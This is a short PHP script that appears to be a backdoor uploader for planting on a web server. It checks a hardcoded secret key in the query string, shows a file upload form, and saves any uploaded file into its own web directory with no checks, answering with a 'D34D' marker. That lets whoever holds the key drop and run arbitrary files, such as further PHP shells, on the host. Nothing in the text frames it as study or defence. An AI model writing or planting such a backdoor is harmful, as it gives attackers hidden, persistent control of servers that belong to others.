<?php
$secret = "d34d";

// Check the GET key
if (!isset($_GET['key']) || $_GET['key'] !== $secret) {
    http_response_code(403);
    exit("Forbidden");
}

// Show upload form if accessed via browser
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo '<form method="POST" enctype="multipart/form-data">
            <input type="file" name="up">
            <input type="submit" value="Upload">
          </form>';
    exit;
}

// Handle file upload via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['up'])) {
    $filename = basename($_FILES['up']['name']);
    $temp = $_FILES['up']['tmp_name'];
    
    if (move_uploaded_file($temp, $filename)) {
        echo "Uploaded: $filename\nD34D";
    } else {
        echo "Upload failed\nD34D";
    }
}
?>
